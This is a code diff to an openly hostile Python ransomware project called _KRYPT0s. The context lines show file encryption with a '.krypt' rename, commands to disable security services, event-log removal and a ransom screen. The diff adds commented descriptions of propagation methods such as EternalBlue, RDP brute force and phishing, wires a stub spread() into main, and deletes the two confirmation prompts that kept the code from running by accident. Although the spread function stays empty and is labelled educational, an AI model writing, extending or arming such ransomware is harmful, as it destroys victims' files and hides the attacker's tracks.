@@ -44,9 +44,24 @@ def kill_ransomware_file():
     except:
         sys.exit()
 
-# A simple spreading mechanisim, disabled by default
-def spread(spread=False):
-    # To be implemented
+# A spreading mechanisim - WILL NOT BE IMPLEMENTED
+def spread():
+    # Here attackers would utilize a spreading mechanism, similar to what WannaCry used, targeting SMBv1 services to propagate with its own scanner.
+    # Attackers can spread such malware through various methods including but not limited to:
+    #
+    # 1. **Email Phishing**: Sending malicious attachments or links to unsuspecting victims, tricking them into opening the email and executing the malware.
+    # 2. **Network Propagation**: Exploiting vulnerabilities in network services such as SMB (Server Message Block) to spread across the local network. This method involves:
+    #    - Scanning the network for vulnerable devices.
+    #    - Exploiting known vulnerabilities (e.g., EternalBlue) to gain access.
+    #    - Copying the ransomware payload to the compromised devices and executing it.
+    # 3. **USB Drives**: Infecting removable storage devices so that when they are plugged into other computers, the ransomware spreads.
+    # 4. **Malvertising**: Using malicious advertisements on legitimate websites to distribute malware. When users click on these ads, they are redirected to a page that exploits browser vulnerabilities to download the ransomware.
+    # 5. **Drive-by Downloads**: Compromising legitimate websites to serve malware. When users visit these sites, the ransomware is automatically downloaded and executed without the user's knowledge.
+    # 6. **Exploiting Remote Services**: Targeting remote desktop services (RDP) or other remote access services by brute-forcing credentials or exploiting vulnerabilities.
+    # 7. **File Sharing Networks**: Spreading through peer-to-peer (P2P) networks by disguising the ransomware as legitimate software.
+    # 8. **Social Engineering**: Trick users into downloading and running the ransomware by pretending to be a trusted entity (e.g., a software update or a legitimate application).
+
+    # As this function is for educational purposes only, it does not implement any actual spreading mechanism.
     pass
 
 # Start up commands for CMD and Powershell to attempt to disable security services
@@ -123,7 +138,7 @@ def encrypt_file(file_path, key):
         with open(file_path, 'wb') as file:
             file.write(encrypted_data)
             
-        rename_file_with_counter(file_path, '.krypt')
+        rename_file_with_counter(file_path, '.krypt') # Just rename
     except PermissionError:
         try:
             rename_file_with_counter(file_path, '.krypt') # Just rename
@@ -218,12 +233,13 @@ def main():
     drives = list_drives()
     parallel_search(drives, mm[:key_len])
     
+    # In a real life attack, this function would exist and propogate
+    spread()
+    
     # Clean up and display screen
     zero_and_unlock(mm, key_len, kernel_memory)
     attempt_rem_event_logs()
     launch_gui() # Display only when all files are encrypted
 
 if __name__ == "__main__":
-    input("ARE YOU SURE YOU WANT TO LAUNCH? THIS WILL CAUSE YOUR DEVICE SEVERE HARM!!! -> Final Warning") # will delete when project is finished
-    input("Press any key again to confirm, this is to prevent accidental execution on main machine") # will delete when project is finished
     main() # Launch _KRYPT0s
